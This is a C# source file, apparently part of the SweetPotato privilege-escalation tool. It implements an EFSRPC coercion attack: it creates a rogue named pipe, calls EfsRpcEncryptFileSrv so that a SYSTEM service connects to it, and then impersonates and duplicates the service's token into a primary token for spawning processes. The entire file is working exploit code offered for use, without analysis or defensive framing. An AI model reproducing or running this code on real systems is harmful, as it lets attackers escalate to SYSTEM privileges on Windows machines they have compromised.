using rpc_df1941c5_fe89_4e79_bf10_463657acf44d_1_0;
using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Threading;
using NtApiDotNet.Win32.Rpc.Transport;

namespace SweetPotato {

    public enum RpcTransport
    {
        ncalrpc,
        ncacn_np,
    }

    public enum RpcInterface
    {
        efsrpc,
        lsarpc,
    }
    internal class EfsRpc {

        //
        // https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/403c7ae0-1a3a-4e96-8efc-54e79a2cc451
        //
        public static readonly Dictionary<RpcInterface, string> RpcInterfaceUuidMap = new Dictionary<RpcInterface, string>() {
            { RpcInterface.efsrpc, "df1941c5-fe89-4e79-bf10-463657acf44d"}, 
            { RpcInterface.lsarpc, "c681d488-d850-11d0-8c52-00c04fd90f7e" } 
        };


        string pipeName = Guid.NewGuid().ToString();

        NamedPipeServerStream efsrpcPipe;
        Thread efsrpcPipeThread;
        IntPtr systemImpersonationToken = IntPtr.Zero;

        public IntPtr Token { get {return systemImpersonationToken; } }

        void EfsRpcPipeThread() {

            byte[] data = new byte[4];

            efsrpcPipe = new NamedPipeServerStream($"{pipeName}\\pipe\\srvsvc", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048);
            efsrpcPipe.WaitForConnection();

            Console.WriteLine("[+] Server connected to our evil RPC pipe");

            efsrpcPipe.Read(data, 0, 4);

            efsrpcPipe.RunAsClient(() => {
                if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),
                    ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle)) {
                    Console.WriteLine("[-] Failed to open thread token");
                    return;
                }

                if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,
                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken)) {
                    Console.WriteLine("[-] Failed to duplicate impersonation token");
                    return;
                }
                
                Console.WriteLine("[+] Duplicated impersonation token ready for process creation");
            });

            efsrpcPipe.Close();
        }

        public EfsRpc() {
            efsrpcPipeThread = new Thread(EfsRpcPipeThread);
            efsrpcPipeThread.Start();
        }

        public void TriggerEfsRpc(RpcTransport rpcTransport, RpcInterface rpcInterface) {

            string targetPipe = string.Format($"\\\\localhost/pipe/{pipeName}/\\{pipeName}\\{pipeName}");

            Client c = new Client(RpcInterfaceUuidMap[rpcInterface]);

            if (rpcTransport == RpcTransport.ncacn_np)
            {
                RpcTransportSecurity trsec = new RpcTransportSecurity();
                trsec.AuthenticationLevel = RpcAuthenticationLevel.PacketPrivacy;
                trsec.AuthenticationType = RpcAuthenticationType.Negotiate;

                c.Connect("ncacn_np", $"\\pipe\\{rpcInterface}", "localhost", trsec);
            }
            else
            {
                c.Connect();
            }

            Console.WriteLine($"[+] Triggering name pipe access on evil PIPE {targetPipe}");

            c.EfsRpcEncryptFileSrv(targetPipe);
            // More useful functions here https://twitter.com/tifkin_/status/1421225980161626112

        }
    }
}
